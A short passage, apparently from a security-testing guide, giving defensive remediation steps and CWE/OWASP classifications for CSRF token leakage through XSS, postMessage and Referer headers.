**Remediation:** fix the underlying XSS/token-leak first (see `xss-testing`), limit token exposure to pages that need it, add `event.origin` allow-lists to every `postMessage`, kill token-bearing URLs in `Referer` (Referrer-Policy + POST bodies), and keep per-request tokens so a leaked value has a short window.

**CWE / OWASP:** CWE-352 + CWE-79 (XSS) / CWE-200 (token disclosure); OWASP A01 + A03 Injection (2021), legacy A8:2017 with A7:2017.
